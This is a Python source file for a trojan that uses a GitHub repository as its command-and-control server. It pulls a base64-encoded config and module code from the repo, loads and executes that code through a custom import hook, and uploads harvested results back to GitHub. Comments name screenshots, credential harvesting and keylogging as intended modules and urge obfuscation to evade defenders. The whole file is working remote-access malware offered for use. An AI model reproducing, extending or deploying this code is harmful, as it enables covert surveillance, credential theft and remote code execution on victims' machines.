# this is the main trojan, it will pull it's configurations and code from github

import json
import base64
import sys
import time
import importlib
import random
import threading
import queue
import os
import types


from random import randrange
from github3 import login
# uniquely identify this trojan as "abc", determining its config as well as 
# making it easier to manage data, in a full scale version of this project you
# would need a way to generate trojans, set the id and automatically create configs
# and send them up to github as well as compile them into an exe.
trojan_id = ("abc")

# set the variables
trojan_config = ("{}.json".format(trojan_id))
data_path = ("data/{}/".format(trojan_id))
trojan_modules = []
configured = False
task_queue = queue.Queue()

# the next four functions are the meat and potatoes in regards to interaction with the C2 (github)
#########################################################################################################################
# call back to our c2/github and authenticate, retrieve the current repo and branch objects to be used by other functions
#########################################################################################################################
#///NEEDS TO BE OBFUSCATED!!! AND ACL'S PUT IN PLACE SO IF TROJAN IS CAUGHT THEY CAN ONLY ACCESS THE REPO AND NOT DATA!!!
#########################################################################################################################
def connect_to_github():
    gh = login(username="test",password="test")
    #gh = login(username=input("GitHub username:"),password=input("Github password: "))
    repo = gh.repository("<USERNAME>","<REPO>")
    branch = repo.branch("master")

    return gh,repo,branch

#collects the remote files from repo and reads them locally - reads config options as well as module code
def get_file_contents(filepath):

    gh,repo,branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()

    for filename in tree.tree:

        if filepath in filename.path:
            print ("[*] Found file {}".format(filepath))
            blob = repo.blob(filename._json_data["sha"])
            return blob.content

    return None

# retrieves the remote config.JSON doc so that the trojan knows which modules to run
#(screenshots, cred harvesting, keylogger, pranks etc)
def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:

        if task["module"] not in sys.modules:

            exec("import {}".format(task["module"]))

    return config

# calls back to c2 in order to store any collected data
def store_module_result(data):

    gh,repo,branch = connect_to_github()
    remote_path = "data/{}/{}.data".format(trojan_id,random.randint(2000,350000))
    repo.create_file(remote_path,"Beam me up! We are {}".format(trojan_id), data.encode("utf-8"))
    print(remote_path)
    
    return

#repo.create_file(remote_path,"Commit message",base64.b64encode(data))

################################################################################
#this code will be added to the sys.meta_path list - so when the path is searched
#and the required module is not there, our program will go and pull it in
class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

#the find_module will be called in first to see if we can locate the missing module
#in our repo first        
    def find_module(self,fullname,path=None):
        if configured:
            print ("[*] Attempting to retrieve {}".format(fullname))
            new_library = get_file_contents("modules/{}".format(fullname))
#we base64 decode the code and store it in our class
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
            
                return self
#by returning self we tell python that we found some code and it can call load_module
#function to load it - achieved by call native imp module to load a blank module and feed
#our located code into it. After this we need to inject our pieced together module into
#the sys.modules [[RESEARCH sys.modules]] list so that it can be reused for any future
#import calls
            
        return None

    def load_module(self,name):

        module = types.ModuleType(name)
        exec (self.current_module_code,module.__dict__)
        sys.modules[name] = module

        return module

#notes on what is going on here:
    #We define the objects called by class, the objects will work in tandem to locate/create
    #missing modules
    #class will be called when module is not found
################################################################################

#custom module importer to work in tandem with our import hack code
#simply runs through each module within the trojan config file
def module_runner(module):

    task_queue.put(1)
    result = sys.modules[module].run() 
    task_queue.get()

    #store result in our repo
    store_module_result(result)

    return

#main trojan loop - we point the meta_path to our class, which will recursively
#look for the module and pull it in should it not exist
sys.meta_path = [GitImporter()]

#here we are very basically saying that, if there are no tasks/modules to run
#then go and grab a config containing modules to run using the function we
#created earlier
while True:

    if task_queue.empty():

        config = get_trojan_config()
#we utilise the threading library and create a thread object, feeding it args of
#task and module we want
        for task in config:
            t = threading.Thread(target=module_runner,args=(task["module"],))
            t.start()
            time.sleep(random.randint(1,10))

            
    time.sleep(random.randint(1000,10000))
 
